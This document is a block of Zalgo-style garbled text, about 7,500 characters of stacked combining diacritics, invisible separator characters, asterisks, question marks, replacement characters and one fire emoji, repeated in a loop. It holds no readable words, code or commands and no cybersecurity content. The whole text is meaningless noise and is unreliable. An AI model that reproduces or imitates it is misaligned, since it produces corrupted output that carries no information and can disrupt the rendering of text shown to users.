̖̰̮̜̙̎̓͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̆̿